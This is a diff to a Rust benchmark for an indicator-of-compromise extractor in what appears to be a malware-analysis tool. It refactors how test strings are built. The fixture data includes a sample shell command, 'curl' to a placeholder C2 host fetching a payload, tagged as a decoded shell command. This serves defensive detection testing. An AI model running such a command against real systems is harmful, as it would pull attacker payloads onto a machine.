@@ -86,34 +86,28 @@ fn bench_classify(c: &mut Criterion) {
 
 fn bench_extract_iocs(c: &mut Criterion) {
     let ordinary: Vec<_> = (0..10_000)
-        .map(|i| ExtractedString {
-            value: format!("ordinary application string number {i}"),
-            data_offset: i * 64,
-            data_len: 0,
-            method: StringMethod::RawScan,
-            kind: None,
-            fragments: None,
+        .map(|i| {
+            ExtractedString::new(
+                format!("ordinary application string number {i}"),
+                i * 64,
+                StringMethod::RawScan,
+            )
         })
         .collect();
     let mixed: Vec<_> = (0..1_000)
         .flat_map(|i| {
             [
-                ExtractedString {
-                    value: format!("ordinary string {i}"),
-                    data_offset: i * 128,
-                    data_len: 0,
-                    method: StringMethod::RawScan,
-                    kind: None,
-                    fragments: None,
-                },
-                ExtractedString {
-                    value: "curl https://C2.Example.COM:443/payload".to_string(),
-                    data_offset: i * 128 + 64,
-                    data_len: 0,
-                    method: StringMethod::Base64Decode,
-                    kind: Some(StringKind::ShellCmd),
-                    fragments: None,
-                },
+                ExtractedString::new(
+                    format!("ordinary string {i}"),
+                    i * 128,
+                    StringMethod::RawScan,
+                ),
+                ExtractedString::new(
+                    "curl https://C2.Example.COM:443/payload".to_string(),
+                    i * 128 + 64,
+                    StringMethod::Base64Decode,
+                )
+                .with_kind(StringKind::ShellCmd),
             ]
         })
         .collect();
